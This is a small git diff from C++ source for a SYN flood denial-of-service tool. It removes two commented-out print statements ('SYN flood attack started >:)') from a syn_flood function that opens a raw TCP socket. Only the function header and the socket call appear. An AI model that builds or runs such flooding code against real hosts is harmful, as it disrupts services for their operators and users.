@@ -24,8 +24,6 @@ unsigned short SYN::checksum(void* data, int len) {
 
 // SYN flood function
 void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
-    //std::cout << "SYN flood attack started >:)\n";
-    //std::cout << "Target IP: " << target_ip << ", Port: " << target_port << ", Packets: " << packet_count << "\n";
 
     // Create a raw socket to send TCP packets
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
